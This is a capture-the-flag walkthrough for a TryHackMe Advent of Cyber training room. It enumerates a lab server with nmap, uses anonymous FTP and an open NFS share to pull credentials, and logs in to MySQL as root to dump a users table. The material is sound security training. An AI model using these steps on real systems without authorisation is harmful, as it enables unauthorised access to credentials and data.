---
title: "Advent of Cyber Day 11 Elf Applications"
author: Ludovic COULON
date: 2020-05-08
hero: ./images/hero.png
excerpt: "Advent of Cyber Day 11 Elf Applications"
secret: true
---

[TryHackMe | Advent of Cyber](https://tryhackme.com/room/25daysofchristmas)

McSkidy
has been happy with the progress they've been making, but there's still
so much to do. One of their main servers has some integral services
running, but they can't access these services. Did the Christmas Monster lock them out?

Deploy the machine and starting scanning the IP. **The machine may take a few minutes to boot up.**

Check out the supporting material [here](https://docs.google.com/document/d/1qCMuPwBR0gWIDfk_PXt0Jr220JIJAQ-N4foDZDVX59U/edit#).

[How to Mount an NFS Share in Linux](https://linuxize.com/post/how-to-mount-an-nfs-share-in-linux/)

### Setup

```bash
nmap -sV -sC --script vuln
```

On the nmap result we can see the port 21 (tcp) is open and the anonymous login is allowed

```bash
kali@kali:~$ nmap -sV -sC 10.10.18.184
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-07 19:00 EDT
Nmap scan report for 10.10.18.184
Host is up (0.068s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE VERSION
"21/tcp"   open  ftp     vsftpd 3.0.2
| ftp-anon: "Anonymous FTP login allowed" (FTP code 230)
|_Can't get directory listing: PASV failed: 500 OOPS: invalid pasv_address
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.9.45.74
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
```

```bash
ftp 10.10.18.184
cred : anonymous
pass : none
```

```bash
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxrwxrwx    1 0        0              39 Dec 10 23:19 file.txt
drwxr-xr-x    2 0        0               6 Nov 04  2019 pub
d-wx-wx--x    2 14       50              6 Nov 04  2019 uploads
-rw-r--r--    1 0        0             224 Nov 04  2019 welcome.msg
226 Directory send OK.
```

```bash
ftp> get file.txt
local: file.txt remote: file.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for file.txt (39 bytes).
226 Transfer complete.
39 bytes received in 0.00 secs (507.8125 kB/s)
```

```bash
kali@kali:~$ cat file.txt
remember to wipe mysql:
"root"
"ff912ABD*"
```

### #1 What is the password inside the creds.txt file? (hint: NFS)

After the setup we can connect to the mysql database

```bash
mysql -h 10.10.18.184 -uroot -pff912ABD*
```

```bash
kali@kali:~$ mysql -h 10.10.18.184 -uroot -pff912ABD*
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 9
Server version: 5.7.28 MySQL Community Server (GPL)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| data               |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.095 sec)
```

```bash
MySQL [(none)]> use data;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [data]> show tables;
+----------------+
| Tables_in_data |
+----------------+
| USERS          |
+----------------+
1 row in set (0.077 sec)
```

```bash
kali@kali:~$ sudo showmount -e 10.10.18.184
Export list for 10.10.18.184:
/opt/files *
```

```bash
kali@kali:~$ sudo mount 10.10.18.184:/opt/files /tmp
kali@kali:~$ ls /tmp
creds.txt
kali@kali:~$ cat /tmp/creds.txt
the password is **securepassword123**
```

### #2 What is the name of the file running on port 21?

```bash
kali@kali:~$ cat **file.txt**
remember to wipe mysql:
root
ff912ABD*
```

### #3 What is the password after enumerating the database?

```bash
MySQL [data]> SELECT * FROM USERS;
+-------+--------------+
| name  | password     |
+-------+--------------+
| admin | bestpassword |
+-------+--------------+
1 row in set (0.067 sec)
```
